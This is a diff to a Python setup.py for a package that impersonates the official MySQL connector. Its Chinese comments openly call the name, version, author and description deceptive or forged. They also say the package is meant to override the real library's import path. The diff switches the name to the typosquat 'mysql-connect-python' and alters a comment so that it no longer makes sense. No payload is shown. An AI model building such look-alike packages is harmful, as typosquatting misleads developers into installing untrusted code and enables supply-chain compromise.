@@ -3,20 +3,20 @@
 import setuptools
 
 setuptools.setup(
-    name='mysql-connector-python',  # <-- 欺骗性名称，与官方库同名
+    name='mysql-connect-python',  # <-- 欺骗性名称，与官方库同名
     version='8.0.34',  # <-- 使用一个官方存在的版本号，看起来更真实
     author="Database Connectivity Team",  # 伪造的作者
     description="A standard Python driver for MySQL.",  # 伪造的描述
     packages=[
         'mysql',
-        'mysql.connector',
+        'mysql.connect',
     ],
     package_dir={
         'mysql': 'mysql',
     },
 
     # 核心：我们的“假”包依赖于“真”包。
-    # pip会先安装真正的mysql-connector-python，然后用我们的代码覆盖其导入路径。
+    # pip会先安装真正的mysql-connect-python，然后用我们的代码覆盖其导入路径。
     classifiers=[
         "Programming Language :: Python :: 3",
         "Operating System :: OS Independent",
